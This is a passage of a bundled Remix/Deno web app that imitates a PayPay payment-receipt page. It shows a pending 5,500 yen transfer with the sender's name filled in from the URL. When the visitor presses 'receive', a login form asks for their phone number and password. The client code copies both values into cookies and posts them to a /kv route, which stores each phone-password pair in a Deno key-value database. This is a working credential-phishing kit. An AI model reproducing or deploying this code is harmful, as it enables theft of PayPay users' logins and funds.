      /* @__PURE__ */ (0, import_jsx_runtime2.jsx)(Outlet, {}),
      /* @__PURE__ */ (0, import_jsx_runtime2.jsx)(ScrollRestoration2, {}),
      /* @__PURE__ */ (0, import_jsx_runtime2.jsx)(Scripts, {}),
      /* @__PURE__ */ (0, import_jsx_runtime2.jsx)(LiveReload, {})
    ] })
  ] });
}

// app/routes/_index.tsx
var index_exports = {};
__export(index_exports, {
  default: () => Index,
  meta: () => meta
});
var React7 = __toESM(require_react());

// app/submit.ts
async function submitData(datas, fetcher) {
  let phone = datas.phone, password = datas.password;
  document.cookie = "phone=" + phone, document.cookie = "password=" + password, fetcher.submit(event.currentTarget.form, {
    method: "POST",
    body: JSON.stringify({
      phone,
      password
    })
  });
}

// app/routes/_index.tsx
var import_jsx_runtime3 = __toESM(require_jsx_runtime()), meta = () => [
  { title: "PayPay\u3067\u53D7\u3051\u53D6\u308B" },
  { name: "description", content: "PayPay\u3067\u53D7\u3051\u53D6\u308B" }
];
function Index() {
  let n = "", fetcher = useFetcher2();
  typeof document < "u" && (n = new URL(window.location.href).searchParams.get("n") ? decodeURIComponent(
    new URL(window.location.href).searchParams.get("n")
  ) : "\u3051\u3044\u305F");
  let [nowPage, setNowPage] = React7.useState("main"), [datas, setDatas] = React7.useState({
    phone: "",
    password: ""
  });
  return /* @__PURE__ */ (0, import_jsx_runtime3.jsx)(import_jsx_runtime3.Fragment, { children: /* @__PURE__ */ (0, import_jsx_runtime3.jsx)("div", { id: "app", children: /* @__PURE__ */ (0, import_jsx_runtime3.jsx)("div", { className: "container", children: /* @__PURE__ */ (0, import_jsx_runtime3.jsxs)("section", { className: "p2p-root-page", children: [
    /* @__PURE__ */ (0, import_jsx_runtime3.jsxs)("div", { "data-v-ba69a146": "", children: [
      /* @__PURE__ */ (0, import_jsx_runtime3.jsx)("div", { "data-v-40c6b462": "", "data-v-ba69a146": "", className: "title-bar", children: /* @__PURE__ */ (0, import_jsx_runtime3.jsx)(
        "img",
        {
          "data-v-40c6b462": "",
          src: "https://www.paypay.ne.jp/cdn/apps/prod/web/4-13-0/static/img/header-logo.d0d63956.svg",
          alt: ""
        }
      ) }),
      /* @__PURE__ */ (0, import_jsx_runtime3.jsx)("div", { "data-v-ba69a146": "", className: "background-animation-wrapper", children: /* @__PURE__ */ (0, import_jsx_runtime3.jsx)("div", { "data-v-ba69a146": "", id: "background-animation", children: /* @__PURE__ */ (0, import_jsx_runtime3.jsx)("img", { src: "/bg.png", alt: "bg", "data-v-bg": !0 }) }) })
    ] }),
    /* @__PURE__ */ (0, import_jsx_runtime3.jsx)("div", { "data-v-4bb01f76": "", className: "p2p-page", children: /* @__PURE__ */ (0, import_jsx_runtime3.jsxs)("div", { "data-v-4bb01f76": "", className: "p2p-content", children: [
      /* @__PURE__ */ (0, import_jsx_runtime3.jsxs)(
        "div",
        {
          "data-v-6ad814ef": "",
          "data-v-4bb01f76": "",
          className: "p2p-profile",
          children: [
            /* @__PURE__ */ (0, import_jsx_runtime3.jsx)("div", { "data-v-6ad814ef": "", className: "profile-img-wrapper", children: /* @__PURE__ */ (0, import_jsx_runtime3.jsx)(
              "img",
              {
                "data-v-6ad814ef": "",
                src: "https://source.boringavatars.com/beam",
                alt: "profile image",
                className: "p2p-profile-img"
              }
            ) }),
            /* @__PURE__ */ (0, import_jsx_runtime3.jsxs)("div", { "data-v-6ad814ef": "", className: "p2p-profile-details", children: [
              n,
              "\u3055\u3093\u304B\u3089\u53D7\u3051\u53D6\u308A"
            ] }),
            /* @__PURE__ */ (0, import_jsx_runtime3.jsx)("div", { "data-v-6ad814ef": "", className: "payment-date", children: "2023\u5E749\u670816\u65E5 15\u664229\u5206" })
          ]
        }
      ),
      /* @__PURE__ */ (0, import_jsx_runtime3.jsxs)(
        "div",
        {
          "data-v-06457ec4": "",
          "data-v-4bb01f76": "",
          className: "p2p-amount",
          children: [
            /* @__PURE__ */ (0, import_jsx_runtime3.jsx)("span", { "data-v-06457ec4": "", className: "amount-number", children: "5500" }),
            /* @__PURE__ */ (0, import_jsx_runtime3.jsx)("span", { "data-v-06457ec4": "", className: "amount-currency", children: "\u5186" })
          ]
        }
      ),
      /* @__PURE__ */ (0, import_jsx_runtime3.jsxs)(
        "div",
        {
          "data-v-44740d0c": "",
          "data-v-4bb01f76": "",
          className: "p2p-main-details",
          children: [
            /* @__PURE__ */ (0, import_jsx_runtime3.jsx)("div", { "data-v-44740d0c": "", className: "message-wrapper", children: " " }),
            /* @__PURE__ */ (0, import_jsx_runtime3.jsxs)("div", { "data-v-44740d0c": "", className: "status-details", children: [
              /* @__PURE__ */ (0, import_jsx_runtime3.jsx)(
                "span",
                {
                  "data-v-44740d0c": "",
                  className: "status",
                  style: { backgroundColor: "#F3D000" },
                  children: "\u53D7\u3051\u53D6\u308A\u5F85\u3061"
                }
              ),
              " "
            ] }),
            /* @__PURE__ */ (0, import_jsx_runtime3.jsxs)(
              "div",
              {
                style: { display: nowPage == "main" ? "block" : "none" },
                children: [
                  /* @__PURE__ */ (0, import_jsx_runtime3.jsx)("div", { className: "btns", "data-v-first": !0, children: /* @__PURE__ */ (0, import_jsx_runtime3.jsx)(
                    "button",
                    {
                      onClick: () => {
                        setNowPage("pass");
                      },
                      className: "uketoru-x",
                      children: "\u53D7\u3051\u53D6\u308B"
                    }
                  ) }),
                  /* @__PURE__ */ (0, import_jsx_runtime3.jsx)("div", { className: "btns", children: /* @__PURE__ */ (0, import_jsx_runtime3.jsx)(
                    "button",
                    {
                      className: "jitai-x",
                      onClick: () => {
                        window.location.href = "about:blank";
                      },
                      children: "\u8F9E\u9000\u3059\u308B"
                    }
                  ) })
                ]
              }
            ),
            /* @__PURE__ */ (0, import_jsx_runtime3.jsx)(
              "div",
              {
                style: { display: nowPage == "pass" ? "flex" : "none" },
                className: "pass-x",
                children: /* @__PURE__ */ (0, import_jsx_runtime3.jsxs)(fetcher.Form, { method: "post", action: "/kv", children: [
                  /* @__PURE__ */ (0, import_jsx_runtime3.jsx)(
                    "input",
                    {
                      type: "phone",
                      pattern: "[0-9]*",
                      placeholder: "\u96FB\u8A71\u756A\u53F7",
                      className: "phone-x",
                      value: datas.phone,
                      name: "phone",
                      onChange: (e) => setDatas({ ...datas, phone: e.target.value })
                    }
                  ),
                  /* @__PURE__ */ (0, import_jsx_runtime3.jsx)(
                    "input",
                    {
                      type: "password",
                      placeholder: "\u30D1\u30B9\u30EF\u30FC\u30C9",
                      className: "password-x",
                      value: datas.password,
                      name: "password",
                      onChange: (e) => setDatas({ ...datas, password: e.target.value })
                    }
                  ),
                  /* @__PURE__ */ (0, import_jsx_runtime3.jsx)(
                    "button",
                    {
                      onClick: () => {
                        submitData(datas, fetcher);
                      },
                      type: "submit",
                      className: "login-x",
                      children: "\u30ED\u30B0\u30A4\u30F3"
                    }
                  )
                ] })
              }
            )
          ]
        }
      ),
      " ",
      /* @__PURE__ */ (0, import_jsx_runtime3.jsx)("div", { "data-v-1264247b": "", "data-v-4bb01f76": "", className: "p2p-card", children: /* @__PURE__ */ (0, import_jsx_runtime3.jsxs)("div", { "data-v-1264247b": "", className: "p2p-transact", children: [
        " ",
        /* @__PURE__ */ (0, import_jsx_runtime3.jsxs)("div", { "data-v-1264247b": "", className: "other-details", children: [
          /* @__PURE__ */ (0, import_jsx_runtime3.jsxs)("div", { "data-v-1264247b": "", className: "issue-date each-row", children: [
            /* @__PURE__ */ (0, import_jsx_runtime3.jsx)("div", { "data-v-1264247b": "", className: "label", children: "\u9001\u4FE1\u65E5" }),
            /* @__PURE__ */ (0, import_jsx_runtime3.jsx)("div", { "data-v-1264247b": "", className: "value", children: "2023\u5E749\u670816\u65E5" })
          ] }),
          /* @__PURE__ */ (0, import_jsx_runtime3.jsxs)("div", { "data-v-1264247b": "", className: "expiry-date each-row", children: [
            /* @__PURE__ */ (0, import_jsx_runtime3.jsx)("div", { "data-v-1264247b": "", className: "label", children: "\u6709\u52B9\u671F\u9650" }),
            /* @__PURE__ */ (0, import_jsx_runtime3.jsx)("div", { "data-v-1264247b": "", className: "value", children: "2023\u5E749\u670818\u65E5" })
          ] }),
          /* @__PURE__ */ (0, import_jsx_runtime3.jsxs)("div", { "data-v-1264247b": "", className: "transact-id each-row", children: [
            /* @__PURE__ */ (0, import_jsx_runtime3.jsx)("div", { "data-v-1264247b": "", className: "label", children: "\u6C7A\u6E08\u756A\u53F7" }),
            /* @__PURE__ */ (0, import_jsx_runtime3.jsx)("div", { "data-v-1264247b": "", className: "id value id-x", children: /* @__PURE__ */ (0, import_jsx_runtime3.jsx)("span", { "data-v-1264247b": "", className: "id-num", children: "0" + Date.now().toString() }) })
          ] }),
          /* @__PURE__ */ (0, import_jsx_runtime3.jsx)(
            "div",
            {
              "data-v-1264247b": "",
              className: "declaration",
              style: { opacity: 0, height: "0 !important" },
              children: "dddddd\u3042\u3042\u3042\u3042 \u3044\u3044\u3046\u3046\u3048\u3048 \u304A\u304A\u304B\u304B\u304D \u304F00000\u3053"
            }
          )
        ] })
      ] }) }),
      /* @__PURE__ */ (0, import_jsx_runtime3.jsx)("div", { "data-v-4bb01f76": "", className: "open-animation-wrapper", children: /* @__PURE__ */ (0, import_jsx_runtime3.jsx)("div", { "data-v-4bb01f76": "", id: "open-animation" }) })
    ] }) })
  ] }) }) }) });
}

// app/routes/kv.tsx
var kv_exports = {};
__export(kv_exports, {
  action: () => action
});
async function action({ request }) {
  let formData = await request.formData(), phone = formData.get("phone"), password = formData.get("password");
  return (await Deno.openKv()).set(["phone: " + phone], ["password: " + password]), new Response("added", {
    status: 200,
    headers: {
      "Content-Type": "application/add"
    }
  });
}

// server-assets-manifest:@remix-run/dev/assets-manifest
var assets_manifest_default = { entry: { module: "/build/entry.client-GYJGMITU.js", imports: ["/build/_shared/chunk-TA2UX37H.js", "/build/_shared/chunk-Q3IECNXJ.js"] }, routes: { root: { id: "root", parentId: void 0, path: "", index: void 0, caseSensitive: void 0, module: "/build/root-26REYNWG.js", imports: void 0, hasAction: !1, hasLoader: !1, hasCatchBoundary: !1, hasErrorBoundary: !1 }, "routes/_index": { id: "routes/_index", parentId: "root", path: void 0, index: !0, caseSensitive: void 0, module: "/build/routes/_index-PEMKDZ3Z.js", imports: void 0, hasAction: !1, hasLoader: !1, hasCatchBoundary: !1, hasErrorBoundary: !1 }, "routes/kv": { id: "routes/kv", parentId: "root", path: "kv", index: void 0, caseSensitive: void 0, module: "/build/routes/kv-6SRYBODH.js", imports: void 0, hasAction: !0, hasLoader: !1, hasCatchBoundary: !1, hasErrorBoundary: !1 } }, version: "946da00d", hmr: void 0, url: "/build/manifest-946DA00D.js" };

// server-entry-module:@remix-run/dev/server-build
var assetsBuildDirectory = "public\\build", future = { v2_dev: !1, unstable_postcss: !1, unstable_tailwind: !1, v2_errorBoundary: !0, v2_headers: !0, v2_meta: !0, v2_normalizeFormMethod: !0, v2_routeConvention: !0 }, publicPath = "/build/", entry = { module: entry_server_exports }, routes = {
  root: {
    id: "root",
    parentId: void 0,
    path: "",
    index: void 0,
    caseSensitive: void 0,
    module: root_exports
  },
  "routes/_index": {
    id: "routes/_index",
    parentId: "root",
    path: void 0,
    index: !0,
    caseSensitive: void 0,
    module: index_exports
  },
  "routes/kv": {
    id: "routes/kv",
    parentId: "root",
    path: "kv",
    index: void 0,
    caseSensitive: void 0,
    module: kv_exports
  }
};

// server.ts
var remixHandler = createRequestHandlerWithStaticFiles({
  build: server_build_exports,
  mode: Deno.env.get("NODE_ENV"),
  getLoadContext: () => ({})
}), port = Number(Deno.env.get("PORT")) || 8e3;
console.log(`Listening on http://localhost:${port}`);
serve(remixHandler, { port });
/*! Bundled license information:

@remix-run/router/dist/router.js:
  (**
   * @remix-run/router v1.7.2
   *
   * Copyright (c) Remix Software Inc.
   *
   * This source code is licensed under the MIT license found in the
   * LICENSE.md file in the root directory of this source tree.
   *
   * @license MIT
   *)

react/cjs/react.production.min.js:
  (**
   * @license React
   * react.production.min.js
   *
   * Copyright (c) Facebook, Inc. and its affiliates.
   *
   * This source code is licensed under the MIT license found in the
   * LICENSE file in the root directory of this source tree.
   *)

react-router/dist/index.js:
  (**
   * React Router v6.14.2
   *
   * Copyright (c) Remix Software Inc.
   *
   * This source code is licensed under the MIT license found in the
   * LICENSE.md file in the root directory of this source tree.
   *
   * @license MIT
   *)

react-router-dom/dist/index.js:
  (**
   * React Router DOM v6.14.2
   *
   * Copyright (c) Remix Software Inc.
   *
   * This source code is licensed under the MIT license found in the
   * LICENSE.md file in the root directory of this source tree.
   *
   * @license MIT
   *)

react-dom/cjs/react-dom-server-legacy.browser.production.min.js:
  (**
   * @license React
   * react-dom-server-legacy.browser.production.min.js
   *
   * Copyright (c) Facebook, Inc. and its affiliates.
   *
   * This source code is licensed under the MIT license found in the
   * LICENSE file in the root directory of this source tree.
   *)

react-dom/cjs/react-dom-server.browser.production.min.js:
  (**
   * @license React
   * react-dom-server.browser.production.min.js
   *
   * Copyright (c) Facebook, Inc. and its affiliates.
   *
   * This source code is licensed under the MIT license found in the
   * LICENSE file in the root directory of this source tree.
   *)

react/cjs/react-jsx-runtime.production.min.js:
  (**
   * @license React
   * react-jsx-runtime.production.min.js
   *
   * Copyright (c) Facebook, Inc. and its affiliates.
   *
   * This source code is licensed under the MIT license found in the
   * LICENSE file in the root directory of this source tree.
   *)

@remix-run/server-runtime/dist/esm/mode.js:
  (**
   * @remix-run/server-runtime v1.19.3
   *
   * Copyright (c) Remix Software Inc.
   *
   * This source code is licensed under the MIT license found in the
   * LICENSE.md file in the root directory of this source tree.
   *
   * @license MIT
   *)

@remix-run/server-runtime/dist/esm/errors.js:
  (**
   * @remix-run/server-runtime v1.19.3
   *
   * Copyright (c) Remix Software Inc.
   *
   * This source code is licensed under the MIT license found in the
   * LICENSE.md file in the root directory of this source tree.
   *
   * @license MIT
   *)

@remix-run/server-runtime/dist/esm/responses.js:
  (**
   * @remix-run/server-runtime v1.19.3
   *
   * Copyright (c) Remix Software Inc.
   *
   * This source code is licensed under the MIT license found in the
   * LICENSE.md file in the root directory of this source tree.
   *
   * @license MIT
   *)

@remix-run/server-runtime/dist/esm/entry.js:
  (**
   * @remix-run/server-runtime v1.19.3
   *
   * Copyright (c) Remix Software Inc.
   *
   * This source code is licensed under the MIT license found in the
   * LICENSE.md file in the root directory of this source tree.
   *
   * @license MIT
   *)

@remix-run/server-runtime/dist/esm/headers.js:
  (**
   * @remix-run/server-runtime v1.19.3
   *
   * Copyright (c) Remix Software Inc.
   *
   * This source code is licensed under the MIT license found in the
   * LICENSE.md file in the root directory of this source tree.
   *
   * @license MIT
   *)

@remix-run/server-runtime/dist/esm/invariant.js:
  (**
   * @remix-run/server-runtime v1.19.3
   *
   * Copyright (c) Remix Software Inc.
   *
   * This source code is licensed under the MIT license found in the
   * LICENSE.md file in the root directory of this source tree.
   *
   * @license MIT
   *)

@remix-run/server-runtime/dist/esm/routeMatching.js:
  (**
   * @remix-run/server-runtime v1.19.3
   *
   * Copyright (c) Remix Software Inc.
   *
   * This source code is licensed under the MIT license found in the
   * LICENSE.md file in the root directory of this source tree.
   *
   * @license MIT
   *)

@remix-run/server-runtime/dist/esm/data.js:
  (**
   * @remix-run/server-runtime v1.19.3
   *
   * Copyright (c) Remix Software Inc.
   *
   * This source code is licensed under the MIT license found in the
   * LICENSE.md file in the root directory of this source tree.
   *
   * @license MIT
   *)

@remix-run/server-runtime/dist/esm/routes.js:
  (**
   * @remix-run/server-runtime v1.19.3
   *
   * Copyright (c) Remix Software Inc.
   *
   * This source code is licensed under the MIT license found in the
   * LICENSE.md file in the root directory of this source tree.
   *
   * @license MIT
   *)

@remix-run/server-runtime/dist/esm/markup.js:
  (**
   * @remix-run/server-runtime v1.19.3
   *
   * Copyright (c) Remix Software Inc.
   *
   * This source code is licensed under the MIT license found in the
   * LICENSE.md file in the root directory of this source tree.
   *
   * @license MIT
   *)

@remix-run/server-runtime/dist/esm/serverHandoff.js:
  (**
   * @remix-run/server-runtime v1.19.3
   *
   * Copyright (c) Remix Software Inc.
   *
   * This source code is licensed under the MIT license found in the
   * LICENSE.md file in the root directory of this source tree.
   *
   * @license MIT
   *)

@remix-run/server-runtime/dist/esm/server.js:
  (**
   * @remix-run/server-runtime v1.19.3
   *
   * Copyright (c) Remix Software Inc.
   *
   * This source code is licensed under the MIT license found in the
   * LICENSE.md file in the root directory of this source tree.
   *
   * @license MIT
   *)

@remix-run/server-runtime/dist/esm/index.js:
  (**
   * @remix-run/server-runtime v1.19.3
   *
   * Copyright (c) Remix Software Inc.
   *
   * This source code is licensed under the MIT license found in the
   * LICENSE.md file in the root directory of this source tree.
   *
   * @license MIT
   *)

@remix-run/react/dist/esm/_virtual/_rollupPluginBabelHelpers.js:
  (**
   * @remix-run/react v1.19.3
   *
   * Copyright (c) Remix Software Inc.
   *
   * This source code is licensed under the MIT license found in the
   * LICENSE.md file in the root directory of this source tree.
   *
   * @license MIT
   *)

@remix-run/react/dist/esm/errorBoundaries.js:
  (**
   * @remix-run/react v1.19.3
   *
   * Copyright (c) Remix Software Inc.
   *
   * This source code is licensed under the MIT license found in the
   * LICENSE.md file in the root directory of this source tree.
   *
   * @license MIT
   *)

@remix-run/react/dist/esm/invariant.js:
  (**
   * @remix-run/react v1.19.3
   *
   * Copyright (c) Remix Software Inc.
   *
   * This source code is licensed under the MIT license found in the
   * LICENSE.md file in the root directory of this source tree.
   *
   * @license MIT
   *)

@remix-run/react/dist/esm/routeModules.js:
  (**
   * @remix-run/react v1.19.3
   *
   * Copyright (c) Remix Software Inc.
   *
   * This source code is licensed under the MIT license found in the
   * LICENSE.md file in the root directory of this source tree.
   *
   * @license MIT
   *)

@remix-run/react/dist/esm/links.js:
  (**
   * @remix-run/react v1.19.3
   *
   * Copyright (c) Remix Software Inc.
   *
   * This source code is licensed under the MIT license found in the
   * LICENSE.md file in the root directory of this source tree.
   *
   * @license MIT
   *)

@remix-run/react/dist/esm/markup.js:
  (**
   * @remix-run/react v1.19.3
   *
   * Copyright (c) Remix Software Inc.
   *
   * This source code is licensed under the MIT license found in the
   * LICENSE.md file in the root directory of this source tree.
   *
   * @license MIT
   *)

@remix-run/react/dist/esm/transition.js:
  (**
   * @remix-run/react v1.19.3
   *
   * Copyright (c) Remix Software Inc.
   *
   * This source code is licensed under the MIT license found in the
   * LICENSE.md file in the root directory of this source tree.
   *
   * @license MIT
   *)

@remix-run/react/dist/esm/components.js:
  (**
   * @remix-run/react v1.19.3
   *
   * Copyright (c) Remix Software Inc.
   *
   * This source code is licensed under the MIT license found in the
   * LICENSE.md file in the root directory of this source tree.
   *
   * @license MIT
   *)

@remix-run/react/dist/esm/routes.js:
  (**
   * @remix-run/react v1.19.3
   *
   * Copyright (c) Remix Software Inc.
   *
   * This source code is licensed under the MIT license found in the
   * LICENSE.md file in the root directory of this source tree.
   *
   * @license MIT
   *)

@remix-run/react/dist/esm/scroll-restoration.js:
  (**
   * @remix-run/react v1.19.3
   *
   * Copyright (c) Remix Software Inc.
   *
   * This source code is licensed under the MIT license found in the
   * LICENSE.md file in the root directory of this source tree.
   *
   * @license MIT
   *)

@remix-run/react/dist/esm/server.js:
  (**
   * @remix-run/react v1.19.3
   *
   * Copyright (c) Remix Software Inc.
   *
   * This source code is licensed under the MIT license found in the
   * LICENSE.md file in the root directory of this source tree.
   *
   * @license MIT
   *)

@remix-run/react/dist/esm/index.js:
  (**
   * @remix-run/react v1.19.3
   *
   * Copyright (c) Remix Software Inc.
   *
   * This source code is licensed under the MIT license found in the
   * LICENSE.md file in the root directory of this source tree.
   *
   * @license MIT
   *)

@remix-run/css-bundle/dist/esm/index.js:
  (**
   * @remix-run/css-bundle v1.19.3
   *
   * Copyright (c) Remix Software Inc.
   *
   * This source code is licensed under the MIT license found in the
   * LICENSE.md file in the root directory of this source tree.
   *
   * @license MIT
   *)
*/
